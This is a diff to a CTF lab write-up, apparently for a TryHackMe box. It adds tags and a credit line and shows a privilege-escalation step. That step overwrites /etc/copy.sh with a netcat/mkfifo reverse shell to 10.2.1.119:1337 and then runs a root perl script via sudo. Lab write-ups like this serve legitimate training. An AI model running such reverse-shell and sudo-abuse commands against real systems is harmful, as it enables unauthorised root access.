@@ -13,6 +13,9 @@ tags:
   - feroxbuster
   - whatweb
   - FileUpload
+  - perl
+  - sudo
+  - MySQL
 references: "[[📚CTF Box Writeups]]"
 ---
 
@@ -294,6 +297,7 @@ cat backup.pl
 system("sh", "/etc/copy.sh");
 ```
 - Knowing we can run perl as root, lets edit this `copy.sh` script that it calls,
+	- used code from [swisky](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#netcat-traditional). The Netcat BusyBox line
 ```
 www-data@THM-Chal:/etc$ echo "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.1.119 1337 >/tmp/f" > copy.sh
 <p/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.1.119 1337 >/tmp/f" > copy.sh       
@@ -304,7 +308,7 @@ rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.1.119 1337 >/tmp/f
 
 ```
 
-- Execute perl script with sudo
+- Execute #perl script with #sudo
 	- Be sure to use full file paths found in `sudo -l`
 ```
 www-data@THM-Chal:/etc$ sudo /usr/bin/perl /home/itguy/backup.pl
